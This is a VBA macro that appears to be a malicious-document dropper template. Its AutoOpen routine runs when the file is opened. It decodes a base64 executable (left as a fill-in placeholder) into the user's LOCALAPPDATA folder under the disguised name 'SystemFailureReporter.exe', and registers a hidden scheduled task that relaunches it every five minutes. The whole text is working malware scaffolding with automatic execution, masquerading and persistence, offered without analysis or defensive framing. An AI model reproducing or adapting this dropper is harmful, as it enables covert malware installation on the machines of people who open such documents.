Sub AutoOpen()
    Dim targetDir As String
    targetDir = Environ("LOCALAPPDATA") & "\SystemFailureReporter\"
    
    If Dir(targetDir, vbDirectory) = "" Then
        MkDir targetDir
    End If
    
    Dim exeBase64 As String
    exeBase64 = "PUT_YOUR_BASE64_PAYLOAD_HERE"
    
    Dim exeData() As Byte
    exeData = Base64Decode(exeBase64)
    
    Dim fileNum As Integer
    fileNum = FreeFile
    Open targetDir & "SystemFailureReporter.exe" For Binary As #fileNum
    Put #fileNum, , exeData
    Close #fileNum
    
    fileNum = FreeFile
    Open targetDir & "update.xml" For Output As #fileNum
    Close #fileNum
    
    Dim cmd As String
    cmd = "schtasks /create /tn SystemFailureReporter " & _
          "/tr """ & targetDir & "SystemFailureReporter.exe"" " & _
          "/sc minute /mo 5 /f"
    Shell cmd, vbHide
End Sub

Function Base64Decode(ByVal base64String As String) As Byte()
    Dim xmlDoc As Object
    Dim elem As Object
    Dim bytes() As Byte
    
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set elem = xmlDoc.createElement("b")
    elem.DataType = "bin.base64"
    elem.Text = base64String
    bytes = elem.nodeTypedValue
    
    Base64Decode = bytes
End Function
